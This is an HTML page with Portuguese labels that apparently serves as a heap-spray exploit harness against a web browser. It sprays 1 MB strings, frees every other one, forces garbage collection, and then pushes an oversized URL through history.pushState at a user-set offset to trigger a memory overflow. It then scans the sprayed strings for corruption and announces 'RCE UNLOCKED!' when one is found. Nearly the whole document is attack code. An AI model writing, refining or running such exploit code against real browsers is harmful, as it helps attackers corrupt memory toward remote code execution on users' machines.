<!DOCTYPE html>
<html>
<head>
    <title>1MB Raio-X (Diagnóstico)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; margin-top: 20px;
        }
        input { font-size: 30px; background: #222; color: #fff; border: 2px solid #0f0; text-align: center; padding: 10px; width: 300px; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; margin-top: 20px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
    </style>
</head>
<body>

    <h1>1MB Decoder Clash (Raio-X)</h1>
    <p>Reproduzindo o sucesso para analisar o ponto de impacto.</p>

    <div style="text-align:center">
        OFFSET DO TIRO:<br>
        <input type="number" id="offsetInput" value="709520">
    </div>

    <button onclick="startXRay()">INICIAR (1MB)</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const OVERFLOW_AMT = 1024 * 64; 

        // CONFIGURAÇÃO ORIGINAL (Intocada)
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startXRay() {
            let currentOffset = parseInt(document.getElementById('offsetInput').value);

            log(`----------------------------------------`);
            log(`TESTANDO OFFSET: ${currentOffset}`);
            
            // 1. Limpeza
            victims = [];
            await forceGC();

            try {
                // 2. SPRAY (Exato ao original)
                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                rawBuffer.fill(0x42); // 'B'
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                const SPRAY_COUNT = 80; 
                
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims.push(s);
                }

                // 3. BURACOS
                log("Abrindo buracos...");
                for(let i=0; i<SPRAY_COUNT; i+=2) {
                    victims[i] = null;
                }

                await forceGC();

                // 4. EXPLOIT
                log(`Disparando...`);
                setTimeout(() => {
                    try {
                        let buffer = "A".repeat(currentOffset);
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        
                        history.pushState({}, "xray", "/" + buffer);

                        log("Analisando memória...");
                        checkXRay(PAYLOAD_SIZE);

                    } catch (e) {
                        log("Erro: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro Memória: " + e.message);
            }
        }

        function checkXRay(expectedLen) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // VERIFICAÇÃO DETALHADA
                    let byte0 = msg.charCodeAt(0);
                    let byte1 = msg.charCodeAt(1);
                    let byte2 = msg.charCodeAt(2);
                    
                    // Se o tamanho mudou
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT (LENGTH) !!! String ${i}`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert("RCE UNLOCKED!");
                        success = true;
                        break;
                    }

                    // Se o conteúdo mudou
                    if (byte0 !== 66) { // 66 = 'B'
                        log(`[SUCESSO PARCIAL] DADOS atingidos na String ${i}!`, 'win');
                        log(`DUMP (Primeiros bytes): ${byte0.toString(16)} ${byte1.toString(16)} ${byte2.toString(16)}...`);
                        
                        // ANÁLISE AUTOMÁTICA
                        if (byte0 === 1) {
                            log("CONCLUSÃO: O tiro acertou o byte 0 dos dados.");
                            log("O Header deve estar IMEDIATAMENTE antes.");
                        } else {
                            log("CONCLUSÃO: O tiro acertou com dados estranhos. Alinhamento parcial?");
                        }
                        
                        success = true;
                        break;
                    }
                } catch(e) {}
            }
            if(!success) log(`Nada atingido. O spray falhou nesta tentativa.`);
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
